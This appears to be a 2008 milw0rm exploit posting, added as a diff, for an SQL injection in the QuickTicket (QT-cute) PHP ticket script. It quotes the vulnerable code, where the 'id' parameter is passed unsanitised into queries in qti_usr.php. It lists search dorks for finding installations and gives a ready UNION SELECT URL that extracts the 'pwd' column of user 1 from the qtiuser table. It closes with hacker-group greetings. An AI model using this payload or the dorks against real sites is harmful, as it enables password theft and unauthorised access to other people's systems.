@@ -1,0 +1,43 @@
+########################################################
+#            Script name: QuickTicket                  #
+#            Site: http://www.qt-cute.org              #
+#  Vulnerability: remote sql injection at qti_usr.php  #
+#                     Download:                        #
+# v 1.4: http://www.qt-cute.org/download/qti14.zip     #
+# v 1.5.0.3: http://www.qt-cute.org/download/qti15.zip #
+########################################################
+#    Vulnerable code: (1.4 ; 1.5 is pretty the same)   #
+########################################################
+# <- line #43 ->
+# if (isset($_GET['id'])) $id = $_GET['id'];
+# 
+# <- line #124-126 ->
+# // -- COUNT TOPICS --
+# 
+# $oDB->Query('SELECT count(id) as countid FROM '.TABTOPIC.' WHERE firstpostuser='.$id);
+# 
+# <- line #130-132 ->
+# // -- COUNT MESSAGES --
+# 
+# $oDB->Query('SELECT count(id) as countid FROM '.TABPOST.' WHERE userid='.$id);
+# 
+########################################################
+#                       d0rk:                          #
+########################################################
+# powered by QT-cute v1.4
+# powered by QT-cute v1.5
+# intitle:"QT-cute"
+#
+########################################################
+#                      exploit:                        #
+########################################################
+# http://site.tld/path/qti_usr.php?id=4+UNION+ALL+SELECT+0,pwd,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22+from+qtiuser+WHERE+id+=+1--
+# 
+########################################################
+----- ---->> >> >> croconile << << <<---- -----
+^_ w4ck1ng.com crushmachine.com rmachine.net _^
+    ^_   at4re.com arabteam200.com   _^
+    ^_   irc.rmachine.net #w4ck1ng   _^
+               ^_ m@cro.li _^
+
+# milw0rm.com [2008-03-09]
